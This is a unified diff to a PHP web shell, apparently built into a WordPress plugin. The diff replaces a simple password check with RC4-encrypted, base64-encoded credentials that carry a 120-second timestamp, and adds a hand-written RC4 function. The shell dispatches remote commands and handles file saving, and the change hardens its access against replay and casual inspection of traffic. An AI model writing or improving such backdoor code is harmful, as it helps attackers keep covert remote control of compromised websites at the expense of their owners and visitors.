@@ -1,12 +1,13 @@
 <?php
 
 function run_webshell() {
-    if ( !isset($_POST['password']) ) {
-        return 'please enter password';
+    if ( !isset($_POST['password']) or !isset($_POST['key']) ) {
+        return 'please enter password and key';
     }
     $password = $_POST['password'];
-    if ( $password != get_option('webshell_password') ) {
-        return 'wrong password';
+    $key = $_POST['key'];
+    if ( !check_password($password, $key) ) {
+        return 'authentication failed';
     }
     if ( !isset($_POST['command']) ) {
         return 'no command';
@@ -22,6 +23,19 @@ function run_webshell() {
         default:
             return "undefind command: '$command'";
     }
+}
+
+function check_password($password, $key) {
+    $password = base64_decode(rc4(base64_decode($password), $key));
+    $timestamp = explode('@', $password)[1];
+    $password = base64_decode(explode('@', $password)[0]);
+    if ( abs(time() - $timestamp) > 120 ) {
+        return FALSE;
+    }
+    if ( $password != get_option('webshell_password') ) {
+        return FALSE;
+    }
+    return TRUE;
 }
 
 function check_file() {
@@ -60,4 +74,32 @@ function save_file() {
         return 'not allowed';
     }
     return 'no file';
+}
+
+function rc4($data, $pwd) {
+    $key[] = "";
+    $box = array();
+    $pwd_length = strlen($pwd);
+    $data_length = strlen($data);
+    $cipher = "";
+    for ($i = 0; $i < 256; $i++) {
+        $key[$i] = ord($pwd[$i % $pwd_length]);
+        $box[$i] = $i;
+    }
+    for ($j = $i = 0; $i < 256; $i++) {
+        $j = ($j + $box[$i] + $key[$i]) % 256;
+        $tmp = $box[$i];
+        $box[$i] = $box[$j];
+        $box[$j] = $tmp;
+    }
+    for ($a = $j = $i = 0; $i < $data_length; $i++) {
+        $a = ($a + 1) % 256;
+        $j = ($j + $box[$a]) % 256;
+        $tmp = $box[$a];
+        $box[$a] = $box[$j];
+        $box[$j] = $tmp;
+        $k = $box[(($box[$a] + $box[$j]) % 256)];
+        $cipher .= chr(ord($data[$i]) ^ $k);
+    }
+    return $cipher;
 }
